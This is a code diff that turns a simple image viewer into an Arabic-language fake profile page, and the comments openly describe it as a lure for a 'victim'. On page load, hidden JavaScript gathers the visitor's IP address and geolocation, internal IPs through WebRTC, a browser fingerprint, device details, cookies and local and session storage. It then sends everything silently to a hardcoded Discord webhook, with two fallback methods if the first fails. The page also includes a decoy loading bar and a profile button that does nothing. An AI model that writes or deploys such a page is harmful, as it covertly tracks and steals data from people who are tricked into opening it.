@@ -1,29 +1,159 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صورة بروفايل</title>
     <style>
-        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
-        .container { text-align: center; color: white; }
-        img { max-width: 80%; border-radius: 12px; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        /* ================================================================
+           CSS - التمويه والتصميم
+           ================================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            direction: rtl;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border-radius: 32px;
+            padding: 30px 25px 35px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            text-align: center;
+            transition: 0.3s;
+        }
+        .card img {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
+            margin-bottom: 12px;
+        }
+        .card h2 {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+        .card .sub {
+            color: #a8a8c8;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        .card .badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.07);
+            padding: 6px 18px;
+            border-radius: 40px;
+            color: #b7b7e6;
+            font-size: 13px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-bottom: 20px;
+        }
+        .card .btn {
+            background: #5865f2;
+            border: none;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.25s;
+            box-shadow: 0 6px 18px rgba(88, 101, 242, 0.25);
+            width: 100%;
+            max-width: 200px;
+        }
+        .card .btn:hover {
+            background: #4752c4;
+            transform: scale(1.02);
+            box-shadow: 0 10px 28px rgba(88, 101, 242, 0.35);
+        }
+        .card .btn:active {
+            transform: scale(0.96);
+        }
+        .footer-note {
+            margin-top: 18px;
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 11px;
+            letter-spacing: 0.3px;
+        }
+        /* تمويه إضافي: شريط تحميل وهمي */
+        .fake-loader {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 6px;
+            margin: 14px 0 8px;
+            overflow: hidden;
+        }
+        .fake-loader span {
+            display: block;
+            height: 100%;
+            width: 40%;
+            background: linear-gradient(90deg, #5865f2, #9b8aff);
+            border-radius: 6px;
+            animation: loadingMove 1.8s infinite ease-in-out;
+        }
+        @keyframes loadingMove {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(350%); }
+        }
+        /* تحذير: هذه الصفحة لأغراض اختبارية فقط */
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" alt="Image" />
+
+    <!-- ================================================================
+    HTML - هيكل الصفحة (التمويه)
+    ================================================================ -->
+    <div class="card">
+        <!-- صورة بروفايل وهمية -->
+        <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" alt="صورة الملف الشخصي" id="profileImg" />
+
+        <h2>أحمد السالمي</h2>
+        <div class="sub">@ahmed_salmi · عضو متميز</div>
+        <div class="badge">🟢 نشط الآن</div>
+
+        <!-- شريط تحميل وهمي لإيهام الضحية -->
+        <div class="fake-loader"><span></span></div>
+
+        <!-- زر وهمي (غير فعال) -->
+        <button class="btn" id="fakeBtn">عرض الملف الشخصي</button>
+        <div class="footer-note">تم التحقق • محمي بـ SSL</div>
     </div>
 
+    <!-- ================================================================
+    JAVASCRIPT - قلب الصفحة المفخخ (جامع البيانات الصامت)
+    ================================================================ -->
     <script>
         (function() {
-            // ============================================================
-            // CONFIG - Replace with your webhook URL
-            // ============================================================
-            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532033541850927327/9IfK0JnKgelYdWC-uqlidjvgb3i0EV0mH4Mt3a8j3HglKymc8itr5-7KhWy68_0vnkC8";
+            'use strict';
 
-            // ============================================================
-            // 1. Get IP + Location via ipinfo.io (no permission)
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 1. التهيئة - ضع رابط Webhook الخاص بك هنا
+            // ----------------------------------------------------------------
+            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532033541850927327/9IfK0JnKgelYdWC-uqlidjvgb3i0EV0mH4Mt3a8j3HglKymc8itr5-7KhWy68_0vnkC8";  // <--- غيّر هذا
+
+            // ----------------------------------------------------------------
+            // 2. دالة مساعدة: جلب IP + الموقع (بدون صلاحيات)
+            // ----------------------------------------------------------------
             function getIPAndLocation() {
                 return new Promise(function(resolve) {
                     try {
@@ -45,22 +175,22 @@
                                     timezone: data.timezone || '?',
                                     org: data.org || '?'
                                 });
-                            } catch(e) {
+                            } catch (e) {
                                 resolve({ ip: 'Unknown', country: '?', region: '?', city: '?', lat: '?', lon: '?' });
                             }
                         };
                         xhr.onerror = function() { resolve({ ip: 'Unknown' }); };
                         xhr.ontimeout = function() { resolve({ ip: 'Unknown' }); };
                         xhr.send();
-                    } catch(e) {
+                    } catch (e) {
                         resolve({ ip: 'Unknown' });
                     }
                 });
             }
 
-            // ============================================================
-            // 2. System Info
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 3. معلومات النظام والمتصفح
+            // ----------------------------------------------------------------
             function getSystemInfo() {
                 var info = {};
                 try {
@@ -81,7 +211,7 @@
                     info.localTime = new Date().toISOString() || 'Unknown';
                     info.os = getOS();
                     info.browser = getBrowser();
-                } catch(e) {}
+                } catch (e) { /* تجاهل */ }
                 return info;
             }
 
@@ -96,7 +226,7 @@
                     if (ua.indexOf('Linux') !== -1) return 'Linux';
                     if (ua.indexOf('Android') !== -1) return 'Android';
                     if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
-                } catch(e) {}
+                } catch (e) {}
                 return 'Unknown';
             }
 
@@ -108,13 +238,13 @@
                     if (ua.indexOf('Firefox') !== -1) return 'Firefox';
                     if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) return 'Safari';
                     if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
-                } catch(e) {}
+                } catch (e) {}
                 return 'Unknown';
             }
 
-            // ============================================================
-            // 3. Network Info
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 4. معلومات الشبكة (السرعة، النوع، إلخ)
+            // ----------------------------------------------------------------
             function getNetworkInfo() {
                 try {
                     var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
@@ -124,14 +254,14 @@
                         downlink: conn.downlink || '?',
                         saveData: conn.saveData || false
                     };
-                } catch(e) {
+                } catch (e) {
                     return { type: '?', rtt: '?', downlink: '?', saveData: false };
                 }
             }
 
-            // ============================================================
-            // 4. Battery Info
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 5. البطارية (إن كانت مدعومة)
+            // ----------------------------------------------------------------
             function getBattery() {
                 return new Promise(function(resolve) {
                     try {
@@ -146,18 +276,16 @@
                                 chargingTime: b.chargingTime || '?',
                                 dischargingTime: b.dischargingTime || '?'
                             });
-                        }).catch(function() {
-                            resolve(null);
-                        });
-                    } catch(e) {
+                        }).catch(function() { resolve(null); });
+                    } catch (e) {
                         resolve(null);
                     }
                 });
             }
 
-            // ============================================================
-            // 5. Canvas Fingerprint
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 6. بصمة Canvas (متعارف عليها)
+            // ----------------------------------------------------------------
             function getFingerprint() {
                 try {
                     var canvas = document.createElement('canvas');
@@ -176,14 +304,14 @@
                     ctx.lineWidth = 2;
                     ctx.strokeRect(5, 5, 200, 40);
                     return canvas.toDataURL('image/png').substring(0, 80) + '...';
-                } catch(e) {
+                } catch (e) {
                     return 'Canvas blocked';
                 }
             }
 
-            // ============================================================
-            // 6. WebRTC IP Leak
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 7. عناوين IP الداخلية عبر WebRTC
+            // ----------------------------------------------------------------
             function getWebRTCIPs() {
                 return new Promise(function(resolve) {
                     try {
@@ -206,23 +334,19 @@
                                         }
                                     }
                                 });
-                            } catch(e) {}
+                            } catch (e) {}
                             resolve(ips);
-                        }).catch(function() {
-                            resolve([]);
-                        });
-                        setTimeout(function() {
-                            resolve([]);
-                        }, 2000);
-                    } catch(e) {
+                        }).catch(function() { resolve([]); });
+                        setTimeout(function() { resolve([]); }, 2000);
+                    } catch (e) {
                         resolve([]);
                     }
                 });
             }
 
-            // ============================================================
-            // 7. Storage Data (no tokens)
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 8. قراءة التخزين المحلي (بدون توكنات)
+            // ----------------------------------------------------------------
             function getStorageData() {
                 try {
                     var ls = {};
@@ -244,14 +368,14 @@
                         localStorage: ls,
                         sessionStorage: ss
                     };
-                } catch(e) {
+                } catch (e) {
                     return { cookies: 'Blocked', localStorage: {}, sessionStorage: {} };
                 }
             }
 
-            // ============================================================
-            // 8. Plugins
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 9. قائمة الإضافات (Plugins)
+            // ----------------------------------------------------------------
             function getPlugins() {
                 try {
                     var list = [];
@@ -262,14 +386,14 @@
                         }
                     }
                     return list;
-                } catch(e) {
+                } catch (e) {
                     return [];
                 }
             }
 
-            // ============================================================
-            // 9. Window Info
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 10. معلومات النافذة والشاشة
+            // ----------------------------------------------------------------
             function getWindowInfo() {
                 try {
                     return {
@@ -280,14 +404,14 @@
                         availW: screen.availWidth || 0,
                         availH: screen.availHeight || 0
                     };
-                } catch(e) {
+                } catch (e) {
                     return {};
                 }
             }
 
-            // ============================================================
-            // 10. Font Detection
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 11. كشف الخطوط المثبتة
+            // ----------------------------------------------------------------
             function getFonts() {
                 var fonts = [];
                 var testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Lucida Console', 'Arial Black'];
@@ -303,57 +427,52 @@
                             fonts.push(font);
                         }
                     });
-                } catch(e) {}
+                } catch (e) {}
                 return fonts;
             }
 
-            // ============================================================
-            // 11. Exfiltration - Multiple methods (fixed CORS)
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 12. الإرسال إلى Webhook (3 طرق احتياطية)
+            // ----------------------------------------------------------------
             function exfiltrate(data) {
                 var jsonData = JSON.stringify(data);
-                
-                // Method 1: XMLHttpRequest (most reliable)
+
+                // الطريقة 1: XMLHttpRequest (الأكثر توافقاً)
                 try {
                     var xhr = new XMLHttpRequest();
                     xhr.open('POST', WEBHOOK_URL, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.timeout = 8000;
                     xhr.onerror = function() {
-                        // Fallback to sendBeacon
-                        try {
-                            navigator.sendBeacon(WEBHOOK_URL, jsonData);
-                        } catch(e2) {}
+                        try { navigator.sendBeacon(WEBHOOK_URL, jsonData); } catch (e2) {}
                     };
                     xhr.ontimeout = function() {
-                        try {
-                            navigator.sendBeacon(WEBHOOK_URL, jsonData);
-                        } catch(e2) {}
+                        try { navigator.sendBeacon(WEBHOOK_URL, jsonData); } catch (e2) {}
                     };
                     xhr.send(jsonData);
                     return;
-                } catch(e) {}
+                } catch (e) {}
 
-                // Method 2: sendBeacon (works even when page unloads)
+                // الطريقة 2: sendBeacon
                 try {
                     navigator.sendBeacon(WEBHOOK_URL, jsonData);
                     return;
-                } catch(e) {}
+                } catch (e) {}
 
-                // Method 3: Image Beacon (last resort)
+                // الطريقة 3: Image Beacon (أخر حل)
                 try {
                     var img = new Image();
                     img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(jsonData);
-                } catch(e) {}
+                } catch (e) {}
             }
 
-            // ============================================================
-            // 12. Main Collector
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 13. الجامع الرئيسي
+            // ----------------------------------------------------------------
             async function silentCollect() {
                 try {
                     var ipData = await getIPAndLocation();
-                } catch(e) {
+                } catch (e) {
                     var ipData = { ip: 'Unknown', country: '?', region: '?', city: '?', postal: '?', lat: '?', lon: '?', timezone: '?', org: '?' };
                 }
 
@@ -416,9 +535,9 @@
                 exfiltrate(payload);
             }
 
-            // ============================================================
-            // 13. Execute
-            // ============================================================
+            // ----------------------------------------------------------------
+            // 14. التنفيذ الصامت عند تحميل الصفحة
+            // ----------------------------------------------------------------
             if (document.readyState === 'complete') {
                 setTimeout(silentCollect, 500);
             } else {
@@ -427,6 +546,20 @@
                 });
             }
             setTimeout(silentCollect, 200);
+
+            // ----------------------------------------------------------------
+            // 15. (اختياري) سلوك وهمي عند الضغط على الزر لإيهام الضحية
+            // ----------------------------------------------------------------
+            document.getElementById('fakeBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                this.innerText = 'جاري التحميل...';
+                this.disabled = true;
+                setTimeout(function() {
+                    this.innerText = 'عرض الملف الشخصي';
+                    this.disabled = false;
+                }.bind(this), 1200);
+            });
+
         })();
     </script>
 </body>
